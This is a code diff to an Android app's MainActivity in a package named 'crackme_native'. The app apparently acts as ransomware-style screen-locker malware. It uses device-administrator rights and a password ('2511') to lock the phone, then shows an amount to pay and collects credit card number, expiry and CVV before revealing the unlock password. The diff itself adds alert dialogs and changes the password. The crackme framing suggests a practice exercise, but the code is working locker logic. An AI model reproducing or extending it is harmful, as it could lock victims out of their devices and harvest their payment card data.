@@ -1,9 +1,11 @@
 package com.crackme_native.ofirmonis.passwordh;
 
+import android.app.AlertDialog;
 import android.app.admin.DeviceAdminReceiver;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.os.CountDownTimer;
 import android.support.v7.app.AppCompatActivity;
@@ -27,7 +29,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private TextView AmountToPay;
     private Button PayAndUnlockButton;
     private ProgressBar progressBar;
-    private String newPassword = "ofir";
+    private String newPassword = "2511";
+    private AlertDialog alertDialog;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -39,6 +42,14 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         setContentView(R.layout.activity_main);
         this.DeviceAdminComponent = new ComponentName(getApplicationContext(), MyAdminReceiver.class);
         this.devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        this.alertDialog = new AlertDialog.Builder(this).create();
+        this.alertDialog.setTitle("Alert !");
+        this.alertDialog.setButton("Ok", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+
+            }
+        });
         connectXmlToCode();
         this.progressBar.setVisibility(View.GONE);
         this.PayAndUnlockButton.setOnClickListener(this);
@@ -93,6 +104,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     @Override
                     public void onFinish() {
                         progressBar.setVisibility(View.GONE);
+                        alertDialog.setTitle("Done !");
+                        alertDialog.setMessage("you released your device! the password is: "+newPassword);
+                        alertDialog.show();
                         Log.d("finish","you released your device! the password is: "+newPassword);
                     }
                 }.start();
@@ -107,21 +121,29 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         String year = this.Year.getText().toString();
         String cvv = this.CVV.getText().toString();
         if (!creditCard.matches("[0-9]+") || creditCard.length() != 16 || !creditCard.startsWith("4580")) {
-            Log.d("Error","wrong crdit card format");
+            this.alertDialog.setMessage("wrong credit card format");
+            this.alertDialog.show();
+            //Log.d("Error","wrong crdit card format");
         }
         else
             creditCardOk = true;
         if (!month.matches("[0-9]+") || month.length() != 2 || Integer.parseInt(month)< 1 || Integer.parseInt(month) > 12 ) {
+            this.alertDialog.setMessage("wrong month format");
+            this.alertDialog.show();
             Log.d("Error","wrong month format");
         }
         else
             monthOk = true;
         if (!year.matches("[0-9]+") || year.length() != 2 || Integer.parseInt(year)< 17 || Integer.parseInt(year) > 30 ) {
+            this.alertDialog.setMessage("wrong year format");
+            this.alertDialog.show();
             Log.d("Error","wrong year format");
         }
         else
             yearOk = true;
         if (!cvv.matches("[0-9]+") || cvv.length() != 3) {
+            this.alertDialog.setMessage("wrong cvv format");
+            this.alertDialog.show();
             Log.d("Error","wrong cvv format");
         }
         else
